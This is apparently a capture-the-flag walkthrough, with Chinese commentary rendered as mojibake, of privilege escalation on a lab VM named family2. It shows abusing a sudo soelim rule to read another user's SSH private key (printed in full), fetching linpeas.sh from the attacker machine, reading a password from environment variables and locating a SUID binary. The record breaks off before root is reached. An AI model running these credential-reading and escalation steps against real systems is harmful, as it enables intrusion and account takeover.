<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">â””â”€# ssh aaa<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span></span><br><span class="line">aaa<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">â””â”€# ssh dad<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa </span><br><span class="line">dad<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">â””â”€# ssh mum<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa</span><br><span class="line">mom<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">â””â”€# ssh baby<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa</span><br><span class="line">Linux family2 <span class="number">5.10</span><span class="number">.0</span><span class="number">-9</span><span class="operator">-</span>amd64 #<span class="number">1</span> SMP Debian <span class="number">5.10</span><span class="number">.70</span><span class="number">-1</span> (<span class="number">2021</span><span class="number">-09</span><span class="number">-30</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU<span class="operator">/</span>Linux <span class="keyword">system</span> <span class="keyword">are</span> <span class="keyword">free</span> software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program <span class="keyword">are</span> described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="operator">/</span>usr<span class="operator">/</span>share<span class="operator">/</span>doc<span class="comment">/*/copyright.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="comment">permitted by applicable law.</span></span><br><span class="line"><span class="comment">You have mail.</span></span><br><span class="line"><span class="comment">Last login: Mon Nov  1 13:33:11 2021 from 192.168.0.28</span></span><br><span class="line"><span class="comment">baby@family2:~$ </span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><p>babyæœ‰ä¸€ä¸ªmomæƒé™çš„æŒ‡ä»¤soelim</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">baby<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> baby on <span class="symbol">family2:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> baby may run the following commands on <span class="symbol">family2:</span></span><br><span class="line">    (mum) <span class="symbol">NOPASSWD:</span> /usr/bin/soelim</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67adb21cd0e0a243d4fed72e.png"><br>è¿™ä¸ªæŒ‡ä»¤å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶<br>æˆåŠŸè¯»åˆ°mumçš„ç§é’¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">baby@family2:<span class="operator">/</span>home$ sudo <span class="operator">-</span>u mum soelim <span class="symbol">/home/mum/.ssh/id_rsa</span></span><br><span class="line">.lf <span class="number">1</span> <span class="symbol">/home/mum/.ssh/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAo8d07Ufqv8Iu7FoRUcYz8WROGwykIW72J1geSGt4qHWmsnheUleB</span><br><span class="line"><span class="number">90</span>HPkDtEv2lbbLRwbBvD0n9bXToliGTwsEi02STssQVizJ4KOujHHhv31K0tfxhP0kjHdC</span><br><span class="line">zU71RX7d<span class="symbol">/XksMWy/Ui2o2ME75tV86ej0SJ6oVmXdhEBg/37mHHdck3vSduKBVCFEkuc+VP</span></span><br><span class="line"><span class="number">5</span>gxSDUVsXeREipoIzBA61btF<span class="symbol">/tShhGkGeMt/xsETllKbnEYZDZm+LYMBwqH5rr33FNa+4i</span></span><br><span class="line">eKBbORjgPkT9mCUfmi1kyTlJToiGnHMhdiq8yZZlpU<span class="operator">+</span><span class="symbol">/tC3+M5y9YvJZ7WlMsY46ukeA24</span></span><br><span class="line">TQ<span class="operator">+</span>CntneHuJVRMVn4RImNwxa35BCNMWYdQ<span class="operator">+</span>wpZfSUxmrteyGmRNsRT8LGzbe<span class="symbol">/jsu8TKs6e</span></span><br><span class="line">Xib85QAeTlPXOJQI<span class="operator">+</span>j8m72pjSsRghQF<span class="operator">+</span>sR<span class="symbol">/wtIcNjwb+1fR+RJJ8MRdz9t3k6DIL2VPAZR</span></span><br><span class="line"><span class="number">1</span>PmAGVsz<span class="operator">+</span><span class="number">32</span>fZfBBpM2Kcgs9cKVOGbhoHE<span class="symbol">/kc8ETAAAFgKNndd2jZ3XdAAAAB3NzaC1yc2</span></span><br><span class="line">EAAAGBAKPHdO1H6r<span class="symbol">/CLuxaEVHGM/FkThsMpCFu9idYHkhreKh1prJ4XlJXgfdBz5A7RL9p</span></span><br><span class="line">W2y0cGwbw9J<span class="symbol">/W106JYhk8LBItNkk7LEFYsyeCjroxx4b99StLX8YT9JIx3Qs1O9UV+3f15</span></span><br><span class="line">LDFsv1ItqNjBO<span class="operator">+</span>bVfOno9EieqFZl3YRAYP9<span class="operator">+</span><span class="number">5</span>hx3XJN70nbigVQhRJLnPlT<span class="operator">+</span>YMUg1FbF3k</span><br><span class="line">RIqaCMwQOtW7Rf7UoYRpBnjLf8bBE5ZSm5xGGQ2Zvi2DAcKh<span class="operator">+</span>a699xTWvuInigWzkY4D5E</span><br><span class="line"><span class="symbol">/ZglH5otZMk5SU6IhpxzIXYqvMmWZaVPv7Qt/jOcvWLyWe1pTLGOOrpHgNuE0Pgp7Z3h7i</span></span><br><span class="line">VUTFZ<span class="operator">+</span>ESJjcMWt<span class="operator">+</span>QQjTFmHUPsKWX0lMZq7XshpkTbEU<span class="symbol">/Cxs23v47LvEyrOnl4m/OUAHk5T</span></span><br><span class="line"><span class="number">1</span>ziUCPo<span class="symbol">/Ju9qY0rEYIUBfrEf8LSHDY8G/tX0fkSSfDEXc/bd5OgyC9lTwGUdT5gBlbM/t9</span></span><br><span class="line">n2XwQaTNinILPXClThm4aBxP5HPBEwAAAAMBAAEAAAGBAKDUjIE6n08BvJyC8gEQlw<span class="operator">+</span>UhZ</span><br><span class="line">LQfhkK4xTN1qcdSpZ7OmCGDXHk1w7dBJxJZ4BkUNBV<span class="symbol">/RRcy5bZU/of0J25Khaiv12BgiFv</span></span><br><span class="line"><span class="symbol">/Y6cH8Wrs2Vg56VlDomBcVk5+QufvtbrR5GjwAkyJR/SsRBX8detp6iTkWd1Uc4Ig/biGi</span></span><br><span class="line">Kt6bWhNYL4PxE0OFuKTKKpHsHWzPhG3wiDRSCKubg1<span class="symbol">/S+PPIeIaPsPCTGDBUT36ZlfHwH+</span></span><br><span class="line">SytSNuYBNR1ySfc8onkzt236x0yAN5DHYRYge82vy<span class="symbol">/agoIeAonYHNpEtK1AjDYrBrreTZ+</span></span><br><span class="line">OtOREyfOh1<span class="operator">+</span>jq4Jf3HczIulml95xEF82gWGfYuX36B6Zg1FUXtCOKV9DEG2nsmTpaGo1ZI</span><br><span class="line">DN6Mbva<span class="symbol">/HXOBv4jm19amxJYK9J5/mawJauuwG2CmhoJDL03V4MeKFjOcdEPBxE3j23R6FI</span></span><br><span class="line">L3xV4gomGs5Cp92jX4P<span class="operator">+</span>dAtAt5kHkwYKbtxaiTQMHQupIgzeJruodIVVqTp0tlQrFJ4QAA</span><br><span class="line">AMAzVhhpPRAXs<span class="symbol">/o/YDnmKWkjbEDDMKbggUDl6lyhf7HbZkTxcPdFfHDGQomFfXSP6TzvSD</span></span><br><span class="line">RKQBvWGiUM82h4YVxd2CfIp<span class="operator">+</span>XJaiiUqeKJ9Qsq4MQv8BGbdvWxQuYR7yz4vu8a<span class="symbol">/QhNqmTb</span></span><br><span class="line">BdJI7IHLuVf6UuPibtoJaaIMd6KunNAEN2QGThNQ9SaZv8TMoaEL4xmca<span class="symbol">/snT3UwjzRvt1</span></span><br><span class="line"><span class="number">2</span>pEMfdjkeMsHkJ<span class="operator">+</span>RgSJkzsTgoLqPVCInRwoEQg1IMx5Pn<span class="symbol">/yMwAAADBANBYctl2AvRTRae+</span></span><br><span class="line">F6PRL84oUGwu71GVJV62Jc6GNOfVF4ucpYLBwh1Q74DoMnxSbP<span class="operator">+</span>BbksirRInBato5Ypd4R</span><br><span class="line"><span class="number">0</span>lW9Np39ajz9<span class="symbol">/hqVdV8w5Zhmxs5gcyEu42gALPbEddQ5Nub7r/95mNAL9Ui2IifbNSRhVT</span></span><br><span class="line">wbr9If0VABmmNp<span class="operator">+</span>zUH7qjEBktr2pZF4gOa<span class="symbol">/pj0yWAtYeKRN22kjdamz4902HWy1DYxKEPS</span></span><br><span class="line">WbnB8ZoPG0LHYyrhG9WmtZOukOLaoOgwAAAMEAyT1zGlhOFvgcNR9ewaZHU97p2m6<span class="symbol">/1lWj</span></span><br><span class="line">D3cP9Hgn1<span class="operator">+</span>IBWq3GvUrgBeG7DEWIKAq<span class="symbol">/dNjR6PaXrwMX2N7o67rJK7oEJMJae35drfUY4p</span></span><br><span class="line">io5sn28<span class="operator">+</span>mPz7q33EWa4pNijTIH<span class="symbol">/I6he7ESSsEsbe0wNu/usC5I315TbWNxyitBrqudOdHR</span></span><br><span class="line">mAQxMOsFzzTlgf6k0mYywlLX2ZKmdsgNd<span class="symbol">/TXlFhKvzaYavNulieSfGDkSAWXm12woT6vwx</span></span><br><span class="line">JminG0qhVpq<span class="operator">/</span><span class="number">4</span>xAAAACm11bUBkZWJpYW4<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸç™»å½•åˆ°mum</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ssh mum@192.168.112.61 -i id_rsa</span></span><br><span class="line">Linux family2 <span class="number">5.10</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 <span class="comment">#1 SMP Debian 5.10.70-1 (2021-09-30) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="regexp">/usr/share/doc/</span>*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">You have <span class="keyword">new</span> mail.</span><br><span class="line">Last login: Mon Nov  <span class="number">1</span> <span class="number">13</span>:<span class="number">33</span>:<span class="number">56</span> <span class="number">2021</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">0.43</span></span><br><span class="line">mum@family2:~$ </span><br></pre></td></tr></table></figure></div>
<h2 id="mum"><a href="#mum" class="headerlink" title="mum"></a>mum</h2><p>æœ‰ä¸¤ä¸ªsudo</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">mum<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> mum on <span class="symbol">family2:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> mum may run the following commands on <span class="symbol">family2:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /usr/bin/shred -f -z /etc/passwd</span><br><span class="line">    (dad) <span class="title class_">ALL</span></span><br></pre></td></tr></table></figure></div>
<p>rootæƒé™è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯å¼ºåˆ¶æ“¦é™¤ &#x2F;etc&#x2F;passwd æ–‡ä»¶ï¼Œå¹¶ç”¨é›¶å¡«å……ï¼Œä»¥é˜²æ•°æ®æ¢å¤<br>è™½ç„¶æœ‰dadçš„æ‰€æœ‰æƒé™ï¼Œä½†æ˜¯ç”¨dadèº«ä»½æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™éœ€è¦è¾“å…¥å¯†ç ï¼Œæˆ‘ä»¬æ²¡æœ‰å¯†ç <br>ç°åœ¨å†ä»æœ¬æœºä¸Šä¼ linpeas.shæ¥æ‰«ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">mum@family2:~$ wget <span class="number">192.168</span>.<span class="number">112.83</span>/linpeas.<span class="keyword">sh</span></span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">23</span>--  http://<span class="number">192.168</span>.<span class="number">112.83</span>/linpeas.<span class="keyword">sh</span></span><br><span class="line">Connecting <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">112.83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">332111</span> (<span class="number">324</span>K) [text/<span class="keyword">x</span>-<span class="keyword">sh</span>]</span><br><span class="line">Saving <span class="keyword">to</span>: â€˜linpeas.<span class="keyword">sh</span>â€™</span><br><span class="line"></span><br><span class="line">linpeas.<span class="keyword">sh</span>                   <span class="number">100</span>%[=============================================&gt;] <span class="number">324.33</span>K  --.-KB/s    in <span class="number">0.01</span>s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">24</span> (<span class="number">26.0</span> MB/s) - â€˜linpeas.<span class="keyword">sh</span>â€™ saved [<span class="number">332111</span>/<span class="number">332111</span>]</span><br><span class="line"></span><br><span class="line">mum@family2:~$ chmod +<span class="keyword">x</span> linpeas.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></div>
<p>åœ¨ç¯å¢ƒå˜é‡ä¸­æˆåŠŸæ‰«å‡ºå¯†ç  <code>passwd=LA0172</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[+] Environment</span><br><span class="line">[i] Any private information inside environment variables?</span><br><span class="line"><span class="attribute">HISTFILESIZE</span>=0</span><br><span class="line"><span class="attribute">USER</span>=mum</span><br><span class="line"><span class="attribute">SSH_CLIENT</span>=192.168.112.83 49728 22</span><br><span class="line"><span class="attribute">XDG_SESSION_TYPE</span>=tty</span><br><span class="line"><span class="attribute">SHLVL</span>=1</span><br><span class="line"><span class="attribute">MOTD_SHOWN</span>=pam</span><br><span class="line"><span class="attribute">HOME</span>=/home/mum</span><br><span class="line"><span class="attribute">SSH_TTY</span>=/dev/pts/1</span><br><span class="line"><span class="attribute">LOGNAME</span>=mum</span><br><span class="line"><span class="attribute">_</span>=./linpeas.sh</span><br><span class="line"><span class="attribute">XDG_SESSION_CLASS</span>=user</span><br><span class="line"><span class="attribute">TERM</span>=xterm-256color</span><br><span class="line"><span class="attribute">XDG_SESSION_ID</span>=50</span><br><span class="line"><span class="attribute">PATH</span>=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin</span><br><span class="line"><span class="attribute">XDG_RUNTIME_DIR</span>=/run/user/1001</span><br><span class="line"><span class="attribute">LANG</span>=en_US.UTF-8</span><br><span class="line"><span class="attribute">HISTSIZE</span>=0</span><br><span class="line"><span class="attribute">SHELL</span>=/bin/bash</span><br><span class="line"><span class="attribute">passwd</span>=LA0172</span><br><span class="line"><span class="attribute">LC_ALL</span>=en_US.UTF-8</span><br><span class="line"><span class="attribute">SSH_CONNECTION</span>=192.168.112.83 49728 192.168.112.61 22</span><br><span class="line"><span class="attribute">HISTFILE</span>=/dev/null</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">mum<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -u dad /bin/bash</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">mum:</span> </span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/home/mum</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<h2 id="dad"><a href="#dad" class="headerlink" title="dad"></a>dad</h2><p>dadè¿™é‡Œsudoéœ€è¦å¯†ç ï¼Œä½†æ˜¯suidé‡Œé¢æœ‰ä¸ªå¯ä»¥çš„æ–‡ä»¶æ˜¯&#x2F;optç›®å½•é‡Œé¢çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">dad<span class="variable">@family2</span>:~<span class="variable">$ </span>find / -u root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">dad<span class="variable">@family2</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/su</span></span><br><span class="line"><span class="regexp">/opt</span><span class="regexp">/clock</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dad@family2:~$ file /opt</span><span class="regexp">/clock</span></span><br><span class="line"><span class="regexp">/opt</span><span class="regexp">/clock: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib</span>64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, BuildID[sha1]=c2d23ea9475938a9dd429b6390c97b750d6a1d84, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span>.<span class="number">0</span>, not stripped</span><br></pre></td></tr></table></figure></div>
<p>æœ‰pythonï¼Œå¼€httpæœåŠ¡ï¼Œæœ¬åœ°ä¸‹è½½è¿™ä¸ªæ–‡ä»¶æŸ¥çœ‹ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">dad@family2:~$ <span class="keyword">python3</span></span><br><span class="line">Python <span class="number">3.9</span>.<span class="number">2</span> (default, Feb <span class="number">28</span> <span class="number">2021</span>, <span class="number">17</span>:<span class="number">03</span>:<span class="number">44</span>) </span><br><span class="line">[GCC <span class="number">10.2</span>.<span class="number">1</span> <span class="number">20210110</span>] <span class="keyword">on</span> linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="built_in">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">KeyboardInterrupt</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">cd</span> /<span class="keyword">opt</span></span><br><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="built_in">line</span> <span class="number">1</span>, in <span class="symbol">&lt;module&gt;</span></span><br><span class="line">NameError: name <span class="string">&#x27;cd&#x27;</span> <span class="keyword">is</span> not defined</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">KeyboardInterrupt</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">exit</span>()</span><br><span class="line">dad@family2:~$ <span class="keyword">cd</span> /<span class="keyword">opt</span></span><br><span class="line">dad@family2:/<span class="keyword">opt</span>$ <span class="keyword">python3</span> -<span class="keyword">m</span> http.server</span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">8000</span>/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ç”¨stringsçœ‹</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# wget <span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>/clock</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">17</span>:<span class="number">07</span>:<span class="number">13</span>--  http://<span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>/clock</span><br><span class="line">Connecting to <span class="number">192.168</span><span class="number">.112</span><span class="number">.61</span>:<span class="number">8000</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="symbol">Length:</span> <span class="number">16096</span> (16K) [application/octet-stream]</span><br><span class="line">Saving to: â€˜clockâ€™</span><br><span class="line"></span><br><span class="line">clock                        <span class="number">100</span>%[=============================================&gt;]  <span class="number">15.</span>72K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">17</span>:<span class="number">07</span>:<span class="number">14</span> (<span class="number">33.2</span> MB/s) - â€˜clockâ€™ saved [<span class="number">16096</span>/<span class="number">16096</span>]</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# strings clock                    </span><br><span class="line">/lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span></span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">__libc_start_main</span><br><span class="line">libc<span class="number">.</span>so<span class="number">.6</span></span><br><span class="line">GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u/UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">date</span><br><span class="line"><span class="comment">;*3$&quot;</span></span><br><span class="line"><span class="symbol">GCC:</span> (Debian <span class="number">10.3</span><span class="number">.0</span>-<span class="number">11</span>) <span class="number">10.3</span><span class="number">.0</span></span><br><span class="line">Scrt1<span class="number">.</span>o</span><br><span class="line">__abi_tag</span><br><span class="line">crtstuff<span class="number">.</span>c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed<span class="number">.0</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">suid<span class="number">.</span>c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">setresuid@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">_edata</span><br><span class="line">system@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">__libc_start_main@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">__cxa_finalize@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line"><span class="meta">.symtab</span></span><br><span class="line"><span class="meta">.strtab</span></span><br><span class="line"><span class="meta">.shstrtab</span></span><br><span class="line"><span class="meta">.interp</span></span><br><span class="line"><span class="meta">.note</span><span class="number">.</span>gnu<span class="number">.</span>build-id</span><br><span class="line"><span class="meta">.note</span><span class="number">.</span>ABI-tag</span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>hash</span><br><span class="line"><span class="meta">.dynsym</span></span><br><span class="line"><span class="meta">.dynstr</span></span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>version</span><br><span class="line"><span class="meta">.gnu</span><span class="number">.</span>version_r</span><br><span class="line"><span class="meta">.rela</span><span class="number">.</span>dyn</span><br><span class="line"><span class="meta">.rela</span><span class="number">.</span>plt</span><br><span class="line"><span class="meta">.init</span></span><br><span class="line"><span class="meta">.plt</span><span class="number">.</span>got</span><br><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.fini</span></span><br><span class="line"><span class="meta">.rodata</span></span><br><span class="line"><span class="meta">.eh_frame_hdr</span></span><br><span class="line"><span class="meta">.eh_frame</span></span><br><span class="line"><span class="meta">.init_array</span></span><br><span class="line"><span class="meta">.fini_array</span></span><br><span class="line"><span class="meta">.dynamic</span></span><br><span class="line"><span class="meta">.got</span><span class="number">.</span>plt</span><br><span class="line"><span class="meta">.data</span></span><br><span class="line"><span class="meta">.bss</span></span><br><span class="line"><span class="meta">.comment</span></span><br></pre></td></tr></table></figure>
<p>é‡Œé¢çš„æŒ‡ä»¤æ˜¯<code>date</code><br>æˆ‘ä»¬å»æ‰§è¡Œè¿™ä¸ªç¨‹åºçœ‹çœ‹èƒ½å¾—åˆ°ä»€ä¹ˆ</p>
